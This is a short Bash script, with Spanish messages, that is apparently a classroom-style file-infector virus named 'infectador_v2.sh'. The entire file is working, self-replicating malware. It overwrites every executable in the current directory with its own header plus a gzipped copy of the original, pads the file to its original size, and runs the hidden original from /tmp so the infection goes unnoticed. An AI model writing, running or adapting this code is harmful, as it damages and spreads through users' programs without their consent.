#!/bin/bash

TAM=1279

for name in *
do

	echo -n "Localizado fichero: " $name

	if [ ! -x $name ];then

		echo -e "\t[NO]"
		continue

	fi

	echo -e "\t[EJECUTABLE]"

	if [ "./$name" = $0 ]; then

		echo "Esquivando el propio programa..."
		continue

	fi

	if [ "./$name" = "./infectador_v2.sh" ]; then

		echo "Esquivando el infectador"
		continue

	fi

	temp_file1=$(mktemp)

	dd if=$name of=$temp_file1 bs=1 count=$TAM >/dev/null 2>&1

	DIFF=$( diff $temp_file1 infectador_v2.sh )

	if [ "$DIFF" = "" ]; then

		echo "Esquivando ya infectado"
		continue

	fi

	echo "Infectando: " $name
	
	temp_file2=$(mktemp)
	temp_file3=$(mktemp)

	cp $name /tmp/tamano

	dd if=$0 of=$temp_file2 bs=1 count=$TAM >/dev/null 2>&1
	gzip < $name > comprimido.gz
	cat $temp_file2 comprimido.gz > $temp_file3
	mv $temp_file3 $name
	rm comprimido.gz
	chmod +x $name


	while [ "$(wc -c < /tmp/tamano)" -ne "$(wc -c < $name)" ]
	do
		echo -n "0" >> $name
	done

done

echo "Ejecutando payload..."

if [ $0 != "./infectador_v2.sh" ]; then
	
	temp_file4=$(mktemp)
	dd if=$0 of=$temp_file4.gz bs=1 skip=$TAM >/dev/null 2>&1 
	gzip -d < $temp_file4.gz > /tmp/descomprimido
	chmod +x /tmp/descomprimido
	/tmp/descomprimido
	rm /tmp/descomprimido

fi

exit
